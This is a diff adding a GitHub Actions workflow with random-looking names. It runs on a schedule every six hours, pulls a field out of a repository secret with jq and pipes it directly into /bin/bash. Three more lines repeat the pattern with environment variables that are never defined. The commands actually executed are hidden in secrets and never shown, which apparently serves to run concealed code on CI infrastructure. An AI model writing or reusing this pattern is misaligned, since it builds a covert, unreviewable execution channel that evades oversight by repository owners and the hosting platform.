@@ -1,0 +1,21 @@
+name: zhongyueling9527
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongyueling9527
+        env:
+          jvv77507: ${{ secrets.jvv77507 }}
+        run: |
+          echo $jvv77507 | jq -r .u307 | /bin/bash
+          echo $xwlq08910 | jq -r .ejmy56348 | /bin/bash
+          echo $lnx013 | jq -r .dehgl9421 | /bin/bash
+          echo $tj5 | jq -r .ozejb26130 | /bin/bash
+
